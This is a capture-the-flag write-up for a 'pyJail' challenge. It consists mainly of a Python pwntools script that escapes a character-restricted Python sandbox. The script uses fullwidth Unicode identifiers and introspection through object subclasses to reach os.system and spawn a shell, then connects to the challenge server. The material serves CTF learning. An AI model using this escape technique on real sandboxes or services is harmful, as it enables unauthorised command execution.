# Cyber Odyssey 2024 - pyJail


Description : here you go, some free points.

<!--more-->

```python
import re
from pwn import *

def craft_num(n):
    """
    craft symbol-only numbers, in an inefficient way
    """
    str_0 = "-([]<[])"
    str_1 = "(-~([]<[]))"
    if n == 0:
        return str_0
    ret = f"{str_1}+" * n
    return ret[:-1]

def denormalize(str):
    ret = ""
    for c in str:
        if c >= "a" and c <= "z":
            # https://www.compart.com/en/unicode/U+FF41
            # weird fullwidth a
            # the first of a sequence of codepoints compatible with ASCII letters
            weird_a = 0xff41
            offset = ord(c) - ord("a")
            ret += chr(weird_a + offset)
        else:
            ret += c
    # replace all underscores that are not at the beginning of an identifier with
    # https://www.compart.com/en/unicode/U+FF3F
    # fullwidth underscore
    ret = re.sub(r"(?<![\.\[\( ])_", chr(0xff3f), ret)
    return ret

def craft_os_str():
    """
    payload for generating the string "_os"
    """
    underscore_str = f"().__init__.__name__[{craft_num(0)}]"  # To generate "_"
    s_str = f"[].__doc__[{craft_num(17)}]"  # To get "s"
    br = "{}"
    o_str = f"{br}.__class__.__base__.__doc__[{craft_num(15)}]"  # To get "o"
    os_str = f"({underscore_str})+({o_str})+({s_str})"
    return os_str

def craft_bash_str():
    """
    payload for generating the string "$0"
    """
    num_0_str = f"({craft_num(0)}).__doc__[{craft_num(33)}]"  # To get "0"
    bash_str = f"'$'+({num_0_str})"
    return bash_str

def find_loader_class_with_globals():
    """
    Dynamically find a loader class with access to `sys.modules`.
    """
    for idx, cls in enumerate(object.__subclasses__()):
        if 'FileLoader' in str(cls):
            # We are now searching for the right method to access sys.modules.
            # The get_data method typically exists and may have access to globals.
            if hasattr(cls, 'get_data'):
                return idx
    return None

file_loader_idx = find_loader_class_with_globals()

if file_loader_idx is not None:
    # Access the loader class without instantiating it
    expl_find_FileLoader = f"().__class__.__base__.__subclasses__()[{craft_num(file_loader_idx)}]"
else:
    raise Exception("FileLoader class not found")

# Access sys.modules via the get_data method (or similar), since we can't use get_source
expl_find_os_module = f"{expl_find_FileLoader}.get_data.__globals__[{craft_os_str()}]"
expl_shell = f"{expl_find_os_module}.system({craft_bash_str()})"

expl = expl_shell
expl = denormalize(expl)

print(expl)

# Connect and execute
#nc misc.akasec.club 4042
#conn = process(["python", "chall.py"])
conn = remote("misc.akasec.club", 4042)
conn.sendlineafter(">", expl.encode())
conn.interactive()

```

## Explanation

Looked up on google pyjail without characters, found this https://halb.it/posts/bluehens-pyjail/, stole the code, modified it so it looks for another way to access sys.modules (cause different machines different python stuff)

